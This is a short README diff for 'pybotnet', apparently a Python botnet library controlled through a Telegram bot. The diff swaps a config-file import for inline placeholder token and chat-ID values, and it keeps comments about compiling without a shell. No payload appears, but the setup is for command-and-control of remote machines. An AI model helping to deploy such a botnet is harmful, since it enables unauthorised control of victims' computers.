@@ -30,15 +30,15 @@ pip install pybotnet
 ```
 
 ```python
-# this is sample_code.py 
 
 from pybotnet import pybotnet
 import time
 
+# Edit this section and enter your information:
+TELEGRAM_TOKEN = '1468299547:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
+ADMIN_CHAT_ID = '12345678910'
 
-# ! rename configs.py.sample to configs.py
-# ! and edit configs.py data
-from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID
+
 
 # * if you compile code without shell: is_sheel=False
 # * show_log: just for debugging
